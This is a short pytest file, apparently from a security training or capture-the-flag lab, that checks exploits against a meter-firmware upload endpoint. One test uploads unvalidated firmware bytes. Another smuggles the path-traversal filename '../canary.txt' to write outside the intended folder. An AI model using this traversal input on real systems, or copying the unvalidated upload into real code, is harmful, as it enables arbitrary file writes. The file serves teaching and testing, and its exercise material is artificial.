def test_fileupload_teach(ops1_admin, base_url, extract_flag_fn, redeem_flag_fn):
    resp = ops1_admin.post(
        f"{base_url}/admin/meters/1/firmware",
        files={"firmware": ("update.bin", b"totally arbitrary firmware bytes, nothing validates this")},
        timeout=10,
    )
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(ops1_admin, base_url, flag)


def test_fileupload_exercise(ops1_admin, base_url, extract_flag_fn, redeem_flag_fn):
    # Client-supplied filename walks the save path out of the intended
    # per-meter folder and into the shared canary target one level up --
    # mirrors the bill-download traversal's simplicity.
    marker = "traversal proof -- landed outside the intended folder"
    resp = ops1_admin.post(
        f"{base_url}/admin/meters/1/firmware",
        files={"firmware": ("../canary.txt", marker.encode())},
        timeout=10,
    )
    assert resp.status_code == 200
    flag = extract_flag_fn(resp.text)
    assert redeem_flag_fn(ops1_admin, base_url, flag)

    # Visible proof, not just a flag string: the canary page now reflects
    # this exact uploaded content.
    canary_resp = ops1_admin.get(f"{base_url}/admin/firmware-canary", timeout=10)
    assert marker in canary_resp.text
